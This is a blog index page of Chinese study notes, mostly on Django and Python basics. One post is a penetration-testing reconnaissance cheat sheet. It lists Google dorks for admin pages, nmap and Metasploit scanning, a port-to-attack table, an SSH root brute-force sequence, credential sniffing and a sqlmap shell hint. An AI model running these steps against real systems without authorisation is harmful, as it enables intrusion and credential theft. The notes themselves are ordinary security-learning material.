<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo Test">
<meta property="og:url" content="http://wcute.github.io/page/3/index.html">
<meta property="og:site_name" content="Hexo Test">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo Test">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://wcute.github.io/page/3/">





  <title>Hexo Test</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo Test</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django--（admin）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/python/Django--（admin）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><p>Admin 简介</p>
<blockquote>
<p>Admin 是 Django 自带的一个功能强大的自动化数据管理界面<br>被授权的用户可直接在 Admin 中管理数据库<br>Django 提供许多针对 Admin 的定制功能</p>
</blockquote>
</li>
<li><p>Admin 配置</p>
<blockquote>
<p>cmd 创建 admin 用户<br>执行 python manage.py createsuperuser<br>密码：admin123..<br>admin 入口：localhost:8000/admin/<br>默认英文界面，修改 settings.py 中的 LANGUAGE_CODE = ‘zh_Hans’ 可变更中文界面</p>
</blockquote>
</li>
<li><p>配置应用</p>
<blockquote>
<p>在应用下 admin.py 中引入应用自身的 models 模块（或里面的模型类）<br>编辑 admin.py :<br>from django.contrib import admin<br>from models import Article<br>admin.site.register(Article)</p>
</blockquote>
</li>
<li><p>修改数据默认显示名称</p>
<blockquote>
<p>在 models.py 的 Article 类中添加一个方法<br>python3 使用 def <strong>str</strong>(self):<br>return self.title<br>python2 使用 def <strong>unicode</strong>(self):<br>return self.title</p>
</blockquote>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django--（Templates）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/python/Django--（Templates）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ol>
<li>在APP的根目录（应用）下创建名叫 Templates 的目录</li>
<li>在 Templates 目录下创建 HTML 文件</li>
<li>在 views.py 中返回 render（）</li>
</ol>
<ul>
<li>views.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">return render(request,&apos;index.html&apos;)</span><br><span class="line"></span><br><span class="line">render(request,&apos;模板文件&apos;,context)</span><br><span class="line"># 前两个参数为必须，第三个参数作用是传送数据到前端，支持dict类型参数，该字典是后台传递到模板的参数，键为参数名，在模板中使用&#123;&#123;参数名&#125;&#125;来直接使用</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>Django 查找 Templates 规则：<br><code>Django</code> 按照 <code>INSTALLED_APPS</code>中的添加顺序查找 <code>Templates</code><br>不同APP下<code>Template</code>目录中的同名<code>.html</code>文件会造成冲突</p>
<p>解决方案：<br>在 APP 的<code>Templates</code>目录下创建以 <code>APP</code>名为名称的目录，将<code>HTML</code> 文件放入新创建的目录下</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django---简单博客搭建（Django安装）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/python/Django---简单博客搭建（Django安装）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="Django-安装"><a href="#Django-安装" class="headerlink" title="Django 安装"></a>Django 安装</h4><ol>
<li>安装<blockquote>
<p>pip install Django==1.10.2</p>
</blockquote>
</li>
<li>查看是否安装成功<blockquote>
<p>python -m django version</p>
</blockquote>
</li>
<li>创建新项目<blockquote>
<p>D:\python&gt;django-admin startproject myblog</p>
</blockquote>
</li>
</ol>
<p>此时自建项目目录生成</p>
<ul>
<li><p>目录结构:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">manage.py            与项目进行交互的命令行工具集的入口</span><br><span class="line"></span><br><span class="line">myblog               项目容器，包含项目最基本的一些配置，目录名不建议修改</span><br><span class="line"></span><br><span class="line">__init__.py          python 中声名模块的文件，默认内容为空</span><br><span class="line"></span><br><span class="line">settings.py          项目总配置文件（数据库、Web应用、时间等配置）</span><br><span class="line"></span><br><span class="line">urls.py              url 配置文件</span><br><span class="line"></span><br><span class="line">wsgi.py              python 与web服务器网关接口</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动django自带的服务器</p>
<blockquote>
<p>python manage.py runserver 【端口】</p>
</blockquote>
</li>
</ul>
<p>显示默认web地址和端口 ，更改端口只需在命令后面加上使用的端口号</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-19607cf2914561ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
<h4 id="应用创建"><a href="#应用创建" class="headerlink" title="应用创建"></a>应用创建</h4><p>创建步骤：</p>
<ol>
<li>打开命令行，进入manage.py 的同级目录</li>
<li>输入：python manage.py startapp blog</li>
<li>添加应用名到 settings.py 中的 INSTALLED_APPS里</li>
</ol>
<ul>
<li><p>应用目录结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">migrations     数据移植模块，内容自动生成</span><br><span class="line"></span><br><span class="line">admin.py       后台管理系统配置</span><br><span class="line"></span><br><span class="line">apps.py        该应用的一些配置，Django-1.9以后自动生成</span><br><span class="line"></span><br><span class="line">models.py      数据模块</span><br><span class="line"></span><br><span class="line">tests.py       自动化测试模块，可在此编写测试脚本</span><br><span class="line"></span><br><span class="line">views.py       执行响应的代码所在模块，代码逻辑处理主要地点，大部分代码在此编写</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建第一个响应页面</p>
</li>
</ul>
<ol>
<li>在 blog 的 views.py 编写代码并保存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line"></span><br><span class="line">return HttpResponse(&apos;hello&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>注：每个响应对应一个函数，函数必须返回一个响应<br>函数必须存在一个参数，一般约定为 request<br>每一个响应函数对应一个URL</p>
<ol start="2">
<li>进入 myblog 的配置文件 settings.py，在 INSTALLED_APPS 中添加 blog 应用</li>
<li>进入 myblog 的url配置文件 urls.py，导入模块并配置url</li>
</ol>
<ul>
<li>URL 配置一<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import blog.views as asd</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^admin/&apos;, admin.site.urls),</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, asd.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：URL函数有三个参数：URL（正则），对应方法，名称<br>URL函数存放在 urlpatterns 列表中</p>
<ul>
<li>URL配置二</li>
</ul>
<p>(1)  在 myblog 的 urls.py 中导入 include 模块，并在urlpatterns中添加url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url,include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, include(&apos;blog.urls&apos;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<p>(2) blog目录下创建urls.py 编写 url 访问方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^$&apos;, views.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>启动服务器python manage.py runserver</li>
<li>打开浏览器，访问 <a href="http://127.0.0.1:8000/index/" target="_blank" rel="noopener">http://127.0.0.1:8000/index/</a></li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4b20e6314620a2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Metasploit渗透测试/渗透测试前期---信息搜集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/Metasploit渗透测试/渗透测试前期---信息搜集/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>##Web 信息搜集：</p>
<ol>
<li>Web 信息搜集（探测）即 Web 踩点，主要是掌握目标Web服务的方方面面，是实现Web渗透入侵前的准备工作</li>
<li>Web 踩点内容包括操作系统（linux、windows等）、服务器类型（服务器平台、版本等）、数据库类型（access、sqlsever、mysql、oracle、postgresql等）、Web 容器（iis、Apache、nginx、tomcat等）、脚本类型（ASP、php/jsp、aspx等）、域名信息、网站目录、CMS、WAF等</li>
<li>Web 信息搜集涉及搜索引擎、网站扫描、域名遍历、指纹识别等工作<h2 id="一-外围信息搜集"><a href="#一-外围信息搜集" class="headerlink" title="一. 外围信息搜集"></a>一. 外围信息搜集</h2></li>
</ol>
<h4 id="1-通过DNS和IP挖掘目标网络信息"><a href="#1-通过DNS和IP挖掘目标网络信息" class="headerlink" title="1. 通过DNS和IP挖掘目标网络信息"></a>1. 通过DNS和IP挖掘目标网络信息</h4><pre><code>1. whois域名注册信息查询
  msf &gt; whois testfire.net
    nslookup与dig域名查询IP2Location地理位置查询    
        dig @&lt;DNS 服务器&gt; &lt;待查询的域名&gt;
        http://www.maxmind.com
2. Google Maps
        http://www.cz88.net(国内IP查询)
3. netcraft网站提供的信息查询服务
        http://searchdns.netcraft.com/ (查询子域名)
        https://toolbar.netcraft.com/site_report
4. IP2Domain 反查域名
        http://www.webscan.cc/
</code></pre><h4 id="2-通过搜索引擎进行信息搜集"><a href="#2-通过搜索引擎进行信息搜集" class="headerlink" title="2. 通过搜索引擎进行信息搜集"></a>2. 通过搜索引擎进行信息搜集</h4><pre><code>1. Google Hacking
    可使用参数：site  filetype inurl intitle intext
    举例：
          inurl:/admin/login.php             # 搜索网址中有 &quot;/admin/login.php&quot; 的网页
          intitle:后台管理 filetypr:php       # 搜索标题是后台管理的 php 页面
          intitle:index of&quot;parent directory&quot; # 搜索根目录相关的索引目录信息
          intext:Powered by wordpress        # 搜索 wordpress 制作的博客网址
          intext:Powered by *CMS             # 搜索*CMS相关的页面
          intext:powered by xxx inurl:login  # 搜索此类网址的后台登录页面
2. 探索网站目录结构
     敏感目录收集方向：robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件
    Google 搜索 parent directory site:baidu.com
        1. 扩展名为inc的文件：可能会包含网站的配置信息，如数据库用户名／口令等，
        2. 扩展名为bak的文件：通常是一些文本编辑器在编辑源代码后留下的备份文件，可以让你知道与其对应的程序脚本文件中的大致内容。
        3. 扩展名为txt或sql的文件：一般包含网站运行的SQL脚本，可能会透露类似数据库结构等信息
3. 搜索网站中的E-mail地址
    msf中search_email_collector模块通过多个搜索引擎的查询结果分析使用此后缀的邮件地址从而获取某个机构的大量邮件地址
4. 搜索易存在SQL注入点的页面
    Google搜索 site:testfire.net inurl:login
5. shodan 搜索
</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/12585049-ab635edd3371c5f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<h2 id="二-主机探测与端口扫描"><a href="#二-主机探测与端口扫描" class="headerlink" title="二.主机探测与端口扫描"></a>二.主机探测与端口扫描</h2><h4 id="1-活跃主机扫描"><a href="#1-活跃主机扫描" class="headerlink" title="1.活跃主机扫描"></a>1.活跃主机扫描</h4><pre><code>1. ICMP Ping 命令
2. Metasploit的主机发现模块
    常用模块
    arp_sweep 使用ARP请求枚举本地局域网中的所有活跃主机
    udp_sweep 通过发送UDP数据包探查制定主机是否活跃，并发现主机上的UDP服务
    arpping(不支持同一网段扫描)
    arping IP   
    arping IP -c 1       //一次返回一条数据
3. 使用Nmap进行主机探测(支持同一网段扫描)
    nmap -sn IP            //扫描存活主机，只做ping扫描不做端口扫描
4. arp侦查-netdiscover
    主动探测
    netdiscover -i eth0 -r 192.168.1.1/24  // -i 指定网卡 -r 指定ip范围
    被动探测
    netdiscover -p
</code></pre><h4 id="2-操作系统辨识"><a href="#2-操作系统辨识" class="headerlink" title="2. 操作系统辨识"></a>2. 操作系统辨识</h4><pre><code>Nmap 扫描 -O 参数对目标操作系统进行识别
Nmap 扫描 -sV 参数对其服务版本进行识别
</code></pre><h4 id="3-端口扫描与服务类型探测"><a href="#3-端口扫描与服务类型探测" class="headerlink" title="3. 端口扫描与服务类型探测"></a>3. 端口扫描与服务类型探测</h4><pre><code>    端口扫描工具：nmap portscan ntscan telnet
1. Metasploit 中的端口扫描器
    msf &gt; search portscan
    ack：通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测
    ftpbounce：通过 FTP bounce 攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTP bounce 攻击，但在一些旧的 Solaris及 FREEBSD系统的FTP服务中此类攻击方式仍能够b被利用
    syn：使用发送 TCP SYN 标志的方式探测开放的端口
    tcp：通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢。
    xmas：一种更为隐秘的扫描方式，通过发送FIN、PSH和URG标志，能够躲避一些高级的TCP标记监测器的过滤。
2. Nmap端口扫描功能
   常见端口
    IIS（HTTP）：80
    SQLServer：1433        爆破
    Oracle：1521
    MySQL：3306        爆破
    FTP：21        匿名访问
    SSH：22        hydra爆破
    Tomcat：8080
    SSL服务：443        心脏出血漏洞 1.0.1g版本之前
    Redis：6379        未授权访问
    weblogic：7001        SSRF/反序列化漏洞、控制台部署 getshell
    zabbix控制台：8069        弱口令/注入
    elasticsearch：9200        远程代码执行漏洞
    memcacache：1121        未授权访问
    mongondb：27017        未授权访问      
    RDP远程桌面：3389        爆破  
    Weblogic默认端口:7001    
    端口类型:
        open：一个应用程序正在此端口上进行监听，以接收来自TCP、UDP或SCTP协议的数据。这是在渗透测试中最关注的一类端口，开放端口往往能够为我们提供一条能够进入系统的攻击路径.（端口开放）
        closed：关闭的端口指的是主机已响应，但没有应用程序监听的端口。这些信息并非毫无价值，扫描出关闭端口至少说明主机是活跃的。（端口关闭）
        filtered：指Nmap不能确认端口是否开放，但根据响应数据猜测该端口可能被防火墙等设备过滤
        unfiltered：仅在使用ACK扫描时，Nmap无法确定端口是否开放，会归为此类。可以使用其他类型的扫描（如Window扫描、SYN扫描、FIN扫描）进一步确认端口的信息。
       open|filtered：端口开放或屏蔽
    常用的Nmap扫描类型参数主要有：
        -p | -F ：-p 指定端口 | -F 执行快速扫描 
        -sT： TCP connect扫描，类似Metasploit中的tcp扫描模块
        -ss： TCP SYN扫描，类似 Metasploit中的syn扫描模块。
        -sF/-sX/-sN：这些扫描通过发送一些特殊的标志位以避开设备或软件的监测。
        -sP：通过发送 ICMP echo请求探测主机是否存活，原理同Ping。
        -sU：探测目标主机开放了哪些UDP端口
        -sA： TCP ACK扫描，类似 Metasploit中的ack扫描模块
</code></pre><h4 id="4-指纹识别"><a href="#4-指纹识别" class="headerlink" title="4. 指纹识别"></a>4. 指纹识别</h4><pre><code>1. whatweb 获取目标网站的系统、容器、脚本、版本信息
   whatweb -h                  # 查看参数
   whatweb url/ip              # 基础扫描
   whatweb -a 3 -v url/ip      # 详细扫描
2. 御剑指纹识别
</code></pre><h2 id="三、服务器扫描与查点"><a href="#三、服务器扫描与查点" class="headerlink" title="三、服务器扫描与查点"></a>三、服务器扫描与查点</h2><h4 id="1-常见网络服务扫描"><a href="#1-常见网络服务扫描" class="headerlink" title="1. 常见网络服务扫描"></a>1. 常见网络服务扫描</h4><pre><code>1. Telnet 服务扫描
    msf &gt; use auxiliary/scanner/telnet/telnet_version
2. SSH 服务扫描
    msf &gt; use auxiliary/scanner/ssh/ssh_version
3. Oracle 数据库服务查点
    msf &gt; use auxiliary/scanner/oracle/tnslsnr_version
4. 开放代理探测与利用
    设置代理服务器
    msf &gt; use auxiliary/scanner/http/open_proxy 
5. nmap服务器扫描
    -sV：版本探测
    -O：启用操作系统探测
    --osscan-limit：对指定的目标系统进行操作系统探测
</code></pre><h4 id="2-口令猜测与嗅探"><a href="#2-口令猜测与嗅探" class="headerlink" title="2. 口令猜测与嗅探"></a>2. 口令猜测与嗅探</h4><pre><code> 1. SSH服务口令猜测
    msf &gt; use auxiliary/scanner/ssh/ssh_login
    msf &gt; set RHOSTS x.x.x.x
    msf &gt; set USERNAME root
    msf &gt; set PASS_FILE /root/words.txt
    msf &gt; set THREADS 50
    msf &gt; run
2. psnuffle 口令嗅探
    截获常见协议的身份认证过程
    msf &gt; use auxiliary/sniffer/psnuffle
</code></pre><h2 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h2><pre><code>1. 弱口令默认后台：admin，admin/login.asp，manage，login.asp等常见后台
2. 查看网页的链接：一般来说，网站的主页有管理登录类似的东西，有些可能被管理员删除
3. 查看网站图片的属性
4. 查看网站使用的管理系统，从而确定后台
5. 用工具查找：www.scan，intellitamper，御剑
6. robots.txt 的帮助：robots.txt文件告诉支柱程序在服务器上什么样的文件可以被查看
7. GooglHacker
8. 查看网站使用的编辑器是否有默认后台
9. 短文件利用
10. sqlmap --sql-shell load_file(&apos;&apos;);
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Python-3-学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/python/Python-3-学习/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>注：制表符缩进和空格缩进不能同时使用</p>
<h2 id="一类-基础语法"><a href="#一类-基础语法" class="headerlink" title="一类 基础语法"></a>一类 基础语法</h2><h4 id="python2-与-python3-区别"><a href="#python2-与-python3-区别" class="headerlink" title="python2 与 python3 区别"></a>python2 与 python3 区别</h4><pre><code>输入输出：
        python2 : raw_input() / input()            print &quot;hello&quot;
        python3 : input()                    print (&quot;hello&quot;)
数字类型：
        python2 没有布尔型，数字0表示False，数字1表示True
        python3 中True和False定义成关键字，但值还是1，0，可以和数字相加
</code></pre><h4 id="常用格式化："><a href="#常用格式化：" class="headerlink" title="常用格式化："></a>常用格式化：</h4><pre><code>tpl = &quot;i am %s&quot; % &quot;alex&quot;
tpl = &quot;i am %s age %d&quot; % (&quot;alex&quot;, 18)
tpl = &quot;i am %(name)s age %(age)d&quot; % {&quot;name&quot;: &quot;alex&quot;, &quot;age&quot;:18}
tpl = &quot;percent %.2f&quot; % 99.97623
tpl = &quot;i am %(pp).2f&quot; % {&quot;pp&quot;: 123.425556, }
tpl = &quot;i am %.2f %%&quot; % {&quot;pp&quot;: 123.425556, }
</code></pre><h4 id="python中常见字符串处理函数："><a href="#python中常见字符串处理函数：" class="headerlink" title="python中常见字符串处理函数："></a>python中常见字符串处理函数：</h4><pre><code>string.capitalize()     // 把字符串的第一个字符大写    
string.decode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;)    // 以 encoding 指定的编码格式解码 string，如果出错默认报一个 ValueError 的 异 常 ， 除非 errors 指 定 的 是 &apos;ignore&apos; 或 者&apos;replace&apos;
string.encode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;)    // 以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是&apos;ignore&apos;或者&apos;replace&apos;
string.find(str, beg=0, end=len(string))          // 检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1            
string.format()        // 格式化字符串
string.lstrip()          // 去除字符串左边的空格
string.rstrip()          // 去除字符串右边的空格
string.strip()           // 去除字符串两边的空格    
